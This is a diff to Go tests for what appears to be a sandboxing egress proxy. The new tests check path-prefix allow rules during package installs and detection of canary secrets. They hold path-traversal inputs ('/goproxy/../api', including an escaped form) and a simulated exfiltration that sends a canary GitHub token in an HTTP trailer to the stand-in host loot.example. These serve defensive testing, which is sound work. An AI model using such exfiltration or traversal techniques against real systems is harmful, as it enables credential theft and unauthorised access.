@@ -644,6 +644,44 @@ func TestTheRegistriesAreAllowedOnlyWhileAnInstallRuns(t *testing.T) {
 	}
 }
 
+func TestAnInstallMayOnlyGetUnderAnInstallGetPrefix(t *testing.T) {
+	api := "abc.execute-api.us-east-1.amazonaws.com"
+	e := New(Config{InstallAllow: RegistryHosts, InstallGet: []string{"https://" + api + "/goproxy/"}})
+	mod := "/goproxy/github.com/!jair!josafath/mcp-customs/demo/mail/@v/list"
+	if e.isAllowed(api) || e.requestAllowed(http.MethodGet, api, &url.URL{Path: mod}) {
+		t.Error("the demo proxy is reachable before the install")
+	}
+	e.Installing(true)
+	if !e.isAllowed(api) {
+		t.Error("during the install, the demo proxy's host must be reachable")
+	}
+	for name, tc := range map[string]struct {
+		method string
+		u      url.URL
+		want   bool
+	}{
+		"a GET of a proxy file":        {http.MethodGet, url.URL{Path: mod}, true},
+		"a HEAD of a proxy file":       {http.MethodHead, url.URL{Path: mod}, true},
+		"a POST to the API":            {http.MethodPost, url.URL{Path: "/api/checks"}, false},
+		"a POST under the prefix":      {http.MethodPost, url.URL{Path: mod}, false},
+		"a GET of a report":            {http.MethodGet, url.URL{Path: "/api/checks/c1"}, false},
+		"a GET climbing out":           {http.MethodGet, url.URL{Path: "/goproxy/../api/checks/c1"}, false},
+		"a GET climbing out, escaped":  {http.MethodGet, url.URL{Path: "/goproxy/../api", RawPath: "/goproxy/%2e%2e/api"}, false},
+		"the prefix's own name, alone": {http.MethodGet, url.URL{Path: "/goproxyx/a"}, false},
+	} {
+		if got := e.requestAllowed(tc.method, api, &tc.u); got != tc.want {
+			t.Errorf("%s: allowed %v, want %v", name, got, tc.want)
+		}
+	}
+	if !e.requestAllowed(http.MethodPost, "proxy.golang.org", &url.URL{Path: "/x"}) {
+		t.Error("a registry is allowed whole during the install")
+	}
+	e.Installing(false)
+	if e.isAllowed(api) || e.requestAllowed(http.MethodGet, api, &url.URL{Path: mod}) {
+		t.Error("the demo proxy is reachable after the install")
+	}
+}
+
 func TestUpstreamURLsAreBuiltFromTheCheckedHostOnly(t *testing.T) {
 	u, _ := url.Parse("/simple/x/?a=1")
 	for name, tc := range map[string]struct {
@@ -779,7 +817,7 @@ func TestDroppedPacketsAreRecordedUpToTheirBound(t *testing.T) {
 	e := New(Config{})
 	e.Observe(rec.observe)
 	for range maxDropped + 3 {
-		e.recordDropped()
+		e.recordDropped(ConnectDetail{}, 1)
 	}
 	obs := rec.of(KindConnect)
 	if len(obs) != maxDropped {
@@ -787,5 +825,35 @@ func TestDroppedPacketsAreRecordedUpToTheirBound(t *testing.T) {
 	}
 	if d, _ := obs[0].(ConnectDetail); d.Via != "direct" || !d.Refused || d.Dropped != 1 {
 		t.Errorf("dropped = %+v", d)
+	}
+}
+
+func TestACanaryInAnHTTPTrailerIsFound(t *testing.T) {
+	ca := newCA(t)
+	rec := newRecorded()
+	e := New(Config{CA: ca, Upstream: &fakeUpstream{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	proxy := httptest.NewServer(e.Proxy())
+	t.Cleanup(proxy.Close)
+	// A body of unknown length is sent chunked, with the trailer after it.
+	body := io.MultiReader(strings.NewReader("hello"))
+	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "http://loot.example/up", body)
+	if err != nil {
+		t.Fatal(err)
+	}
+	req.Trailer = http.Header{"X-K": {testCanaries.Get(canary.GitHubToken)}}
+	resp, err := proxyClient(proxy.URL, ca).Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, _ = io.Copy(io.Discard, resp.Body)
+	_ = resp.Body.Close()
+	obs := rec.of(KindHTTP)
+	if len(obs) != 1 {
+		t.Fatalf("http observations = %+v", obs)
+	}
+	if d, _ := obs[0].(HTTPDetail); !slices.Contains(d.Canaries, findings.Match{Canary: canary.GitHubToken, Encoding: findings.Plain}) {
+		t.Errorf("canaries = %+v, want the token in the trailer", d.Canaries)
 	}
 }
